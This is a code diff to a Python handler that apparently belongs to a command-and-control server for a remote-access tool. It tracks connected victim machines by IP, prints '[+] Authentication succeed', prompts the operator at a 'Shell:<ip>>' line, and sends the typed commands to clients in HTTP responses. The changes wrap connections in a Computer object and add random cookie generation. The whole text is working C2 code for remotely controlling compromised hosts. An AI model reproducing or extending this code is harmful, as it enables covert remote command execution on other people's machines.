@@ -3,6 +3,9 @@ from RuntimeDatabase import RuntimeDatabase
 from HttpResponse import HttpResponse
 from HttpRequest import HttpRequest
 import threading
+import string
+import random
+from Computer import Computer
 
 
 class Handler:
@@ -31,17 +34,17 @@ class Handler:
         :return: None
         """
         if request.request_method == "GET":
-            try:
-                RuntimeDatabase.idle_connections_lock.acquire()
-                RuntimeDatabase.idle_connections[addr[0]].close()  # Close previous socket
-                RuntimeDatabase.idle_connections_lock.release()
-            except KeyError:  # New connection
-                print("[+] Authentication succeed ->", addr)
-                RuntimeDatabase.idle_connections_lock.release()
+
             RuntimeDatabase.idle_connections_lock.acquire()
-            RuntimeDatabase.idle_connections[addr[0]] = client_sock
+            if addr[0] in RuntimeDatabase.idle_connections.keys():
+                RuntimeDatabase.idle_connections[addr[0]].update_socket(client_sock)
+            else:  # New connection
+                print("[+] Authentication succeed ->", addr)
+                # TODO: Check if computer exist in static database
+                RuntimeDatabase.idle_connections[addr[0]] = Computer(addr[0], client_sock)
             RuntimeDatabase.idle_connections_lock.release()
-            Handler.handle_execute_command(addr[0])
+
+            Handler.handle_execute_command(addr[0])  # For Testing
         if request.request_method == "POST":
             try:  # An other handler waiting for this request
                 session_id = request.request_headers['Cookie'].split("=")[1]
@@ -75,8 +78,9 @@ class Handler:
             return
         command = input("Shell:" + ip_address + "> ")
         RuntimeDatabase.idle_connections_lock.acquire()
-        client_socket = RuntimeDatabase.idle_connections[ip_address]
+        client_socket = RuntimeDatabase.idle_connections[ip_address].sock
         RuntimeDatabase.idle_connections_lock.release()
+        cookie_value = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
         client_socket.send(HttpResponse.generate_response(200, command, set_cookie="1").encode())
         wait_event = threading.Event()
         RuntimeDatabase.post_request_events_lock.acquire()
